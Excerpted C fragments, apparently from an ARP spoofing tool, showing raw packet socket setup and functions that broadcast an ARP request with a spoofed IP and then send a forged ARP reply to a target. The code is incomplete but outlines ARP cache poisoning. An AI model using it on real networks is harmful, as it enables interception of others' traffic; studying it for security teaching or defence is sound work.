...
int send_packet_to_broadcast(int soc, struct sockaddr_ll *sa, uint8_t *my_mac_addr, char *spoofed_ip, char *target_ip);

uint8_t *get_target_response(int soc, char *target_ip);

int send_ARPreply_to_target(int soc, struct sockaddr_ll *sa, uint8_t *my_mac, char *spoofed_ip, uint8_t *target_mac, char *target_ip);

uint8_t *get_my_mac(int soc, char *device);
...
if ((sendto(soc, arp_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *)sa, sizeof(*sa))) < 0)
...
if ((lest = recvfrom(soc, buf, sizeof(buf), 0, NULL, NULL)) < 0)
...
sendto(soc, arp_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *)sa, sizeof(*sa));
...
if ((soc = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
...
if ((my_mac = get_my_mac(soc, interface)) < 0)
...
send_packet_to_broadcast(soc, &sa, my_mac, spoofed_ip, target_ip);

target_mac = get_target_response(soc, target_ip);

send_ARPreply_to_target(soc, &sa, my_mac, spoofed_ip, target_mac, target_ip);
